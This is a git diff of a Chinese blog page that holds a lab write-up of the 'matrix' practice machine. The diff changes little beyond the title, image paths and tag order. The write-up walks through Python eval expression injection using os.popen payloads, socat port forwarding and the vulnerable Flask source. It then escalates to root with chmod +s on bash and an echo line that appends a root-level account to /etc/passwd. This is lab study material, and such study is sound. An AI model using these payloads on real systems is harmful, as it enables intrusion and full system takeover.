@@ -6,33 +6,33 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Locker靶机---难度easy知识点-表达式注入 | iiiiiiiiii的博客</title>
+  <title>matrix靶机---难度easy知识点-表达式注入 | iiiiiiiiii的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="matrix靶机—难度easy知识点-表达式注入">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Locker靶机---难度easy知识点-表达式注入">
+<meta property="og:title" content="matrix靶机---难度easy知识点-表达式注入">
 <meta property="og:url" content="http://example.com/2025/06/19/matrix/index.html">
 <meta property="og:site_name" content="iiiiiiiiii的博客">
 <meta property="og:description" content="matrix靶机—难度easy知识点-表达式注入">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="d:\blog\source\images\matrix\nmap.png">
-<meta property="og:image" content="d:\blog\source\images\matrix\666.png">
-<meta property="og:image" content="d:\blog\source\images\matrix\222222.png">
-<meta property="og:image" content="d:\blog\source\images\matrix\root1.png">
-<meta property="og:image" content="d:\blog\source\images\matrix\root2.png">
-<meta property="og:image" content="d:\blog\source\images\matrix\root3.png">
-<meta property="og:image" content="d:\blog\source\images\matrix\1111.png">
-<meta property="og:image" content="d:\blog\source\images\matrix\333.png">
-<meta property="og:image" content="d:\blog\source\images\matrix\bash.png">
-<meta property="og:image" content="d:\blog\source\images\matrix\pass.png">
-<meta property="og:image" content="d:\blog\source\images\matrix\passwd2.png">
-<meta property="og:image" content="d:\blog\source\images\matrix\succ.png">
+<meta property="og:image" content="http://example.com/images/matrix/nmap.png">
+<meta property="og:image" content="http://example.com/images/matrix/666.png">
+<meta property="og:image" content="http://example.com/images/matrix/222222.png">
+<meta property="og:image" content="http://example.com/images/matrix/root1.png">
+<meta property="og:image" content="http://example.com/images/matrix/root2.png">
+<meta property="og:image" content="http://example.com/images/matrix/root3.png">
+<meta property="og:image" content="http://example.com/images/matrix/1111.png">
+<meta property="og:image" content="http://example.com/images/matrix/333.png">
+<meta property="og:image" content="http://example.com/images/matrix/bash.png">
+<meta property="og:image" content="http://example.com/images/matrix/pass.png">
+<meta property="og:image" content="http://example.com/images/matrix/passwd2.png">
+<meta property="og:image" content="http://example.com/images/matrix/succ.png">
 <meta property="article:published_time" content="2025-06-19T15:00:18.367Z">
-<meta property="article:modified_time" content="2025-06-19T16:14:34.955Z">
+<meta property="article:modified_time" content="2025-06-20T16:33:20.455Z">
 <meta property="article:author" content="Starrui">
 <meta property="article:tag" content="表达式注入">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="d:\blog\source\images\matrix\nmap.png">
+<meta name="twitter:image" content="http://example.com/images/matrix/nmap.png">
   
     <link rel="alternative" href="/atom.xml" title="iiiiiiiiii的博客" type="application/atom+xml">
   
@@ -186,7 +186,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Locker靶机---难度easy知识点-表达式注入
+      matrix靶机---难度easy知识点-表达式注入
     </h1>
   
 
@@ -209,11 +209,11 @@
       
         <h2 id="matrix靶机—难度easy知识点-表达式注入"><a href="#matrix靶机—难度easy知识点-表达式注入" class="headerlink" title="matrix靶机—难度easy知识点-表达式注入"></a>matrix靶机—难度easy知识点-表达式注入</h2><span id="more"></span> 
 
-<h3 id="Nmap扫描发现端口开放"><a href="#Nmap扫描发现端口开放" class="headerlink" title="Nmap扫描发现端口开放"></a>Nmap扫描发现端口开放</h3><p><img src="D:\blog\source\images\matrix\nmap.png" alt="nmap"></p>
+<h3 id="Nmap扫描发现端口开放"><a href="#Nmap扫描发现端口开放" class="headerlink" title="Nmap扫描发现端口开放"></a>Nmap扫描发现端口开放</h3><p><img src="/../images/matrix/nmap.png" alt="nmap"></p>
 <p>我们访问看下80没用 我们看5000这里注入下这个输入框</p>
-<p><img src="D:\blog\source\images\matrix\666.png" alt="666"></p>
+<p><img src="/../images/matrix/666.png" alt="666"></p>
 <p>这里输入引号直接报错了我们可以试试表达式注入因为是一python脚本</p>
-<p><img src="D:\blog\source\images\matrix\222222.png" alt="222222"></p>
+<p><img src="/../images/matrix/222222.png" alt="222222"></p>
 <p>这里试试PAYLOAD</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; + __import__(&quot;os&quot;).popen(&quot;whoami&quot;).read() + &#x27;</span><br></pre></td></tr></table></figure>
 
@@ -232,30 +232,30 @@
 <p>msg&#x3D;{os.system(“whoami”)}&amp;type&#x3D;f                        格式化输出</p>
 <p>msg&#x3D;’+(os.popen(“pwd”).read()+’&amp;type&#x3D;unicode  拼接替换</p>
 <h3 id="拿到shell权限"><a href="#拿到shell权限" class="headerlink" title="拿到shell权限"></a>拿到shell权限</h3><p>发现ROOT也有开了一共服务本地可以访问的8000端口</p>
-<p><img src="D:\blog\source\images\matrix\root1.png" alt="root1"></p>
+<p><img src="/../images/matrix/root1.png" alt="root1"></p>
 <p>这里通过socat转发代码如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./socat TCP-LISTEN:8080,fork TCP4:127.0.0.1:8000 &amp;</span><br></pre></td></tr></table></figure>
 
 <p>而且还给了源码我们来分析下</p>
-<p><img src="D:\blog\source\images\matrix\root2.png" alt="root2"></p>
+<p><img src="/../images/matrix/root2.png" alt="root2"></p>
 <p>注意注意 这里我们PAYload不能用unicode的那个了因为过滤了空格不能闭合了 我们用第二个可以读取</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">def dynamic_execute(type_str, expression):</span><br><span class="line">    command = &quot;%s&#x27;%s&#x27;&quot;%(type_str,expression)  # 拼接出要执行的命令</span><br><span class="line">    print(command)</span><br><span class="line">    return eval(command)  # 执行拼接后的命令</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/message&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span><br><span class="line">def handle_message():</span><br><span class="line">    if request.method == &#x27;GET&#x27;:</span><br><span class="line">        return render_template(&#x27;message.html&#x27;)  # 渲染留言页面</span><br><span class="line">    else:</span><br><span class="line">        message_type = request.form[&#x27;type&#x27;][:1]  # 获取留言类型</span><br><span class="line">        user_message = request.form[&#x27;msg&#x27;]  # 获取用户留言内容</span><br><span class="line">        username = &quot;Guest&quot;  # 默认用户名为 Guest</span><br><span class="line"></span><br><span class="line">        if len(user_message) &gt; 35:  # 如果留言太长</span><br><span class="line">            return render_template(&#x27;message.html&#x27;, msg=&#x27;留言太长了！&#x27;, status=&#x27;留言失败&#x27;)</span><br><span class="line">    </span><br><span class="line">        user_message = user_message.replace(&#x27; &#x27;, &#x27;&#x27;).replace(&#x27;_&#x27;, &#x27;&#x27;)  # 移除空格和下划线</span><br><span class="line">        result = dynamic_execute(message_type, user_message)  # 动态执行用户输入的内容</span><br><span class="line">        return render_template(&#x27;message.html&#x27;, msg=result, status=f&#x27;&#123;username&#125;,留言成功&#x27;)</span><br><span class="line"></span><br><span class="line">### </span><br></pre></td></tr></table></figure>
 
 <p>但是这里有长度限制我们可以</p>
-<p><img src="D:\blog\source\images\matrix\root3.png" alt="root3"></p>
+<p><img src="/../images/matrix/root3.png" alt="root3"></p>
 <p>chmod +s &#x2F;biin&#x2F;bash &gt;a 给到tmp文件下a 文件然后执行</p>
-<p><img src="D:\blog\source\images\matrix\1111.png" alt="1111"></p>
-<p><img src="D:\blog\source\images\matrix\333.png" alt="333"></p>
-<h3 id="拿root"><a href="#拿root" class="headerlink" title="拿root"></a>拿root</h3><p><img src="D:\blog\source\images\matrix\bash.png" alt="bash"></p>
+<p><img src="/../images/matrix/1111.png" alt="1111"></p>
+<p><img src="/../images/matrix/333.png" alt="333"></p>
+<h3 id="拿root"><a href="#拿root" class="headerlink" title="拿root"></a>拿root</h3><p><img src="/../images/matrix/bash.png" alt="bash"></p>
 <p>这里群主给了另一方法</p>
 <p>修改etc&#x2F;passwd权限通过    0o666表示八进制  linux里面权限也是八进制所以权限是rw-rw-rw</p>
-<p><img src="D:\blog\source\images\matrix\pass.png" alt="pass"></p>
+<p><img src="/../images/matrix/pass.png" alt="pass"></p>
 <p>发现可写了</p>
-<p><img src="D:\blog\source\images\matrix\passwd2.png" alt="passwd2"></p>
+<p><img src="/../images/matrix/passwd2.png" alt="passwd2"></p>
 <p>payload  密码123456</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;ll:$y$j9T$ExvEUV2wz6oo99qy/ZJc61$4CBi7jCbWQ.pBlG9vmnhH0z3.uchXkOXaFIl9Zz5Y18:0:0:xxoo,,,:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>
 
-<p><img src="D:\blog\source\images\matrix\succ.png" alt="succ"></p>
+<p><img src="/../images/matrix/succ.png" alt="succ"></p>
 <h4 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h4><p>1：多学学python </p>
 
       
@@ -540,6 +540,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">Sulogin</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">bash_history</a>
               </li>
              
@@ -548,7 +552,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">Sulogin</a>
+                <a href="javascript:void(0)" class="js-tag color1">Agent</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">dirb</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -568,23 +576,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">smb</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Agent</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">dirb</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">creatab</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">tftp</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">smb</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -604,15 +604,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">表达式注入</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">logic</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">monitor</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">表达式注入</a>
               </li>
              
               <li class="article-tag-list-item">
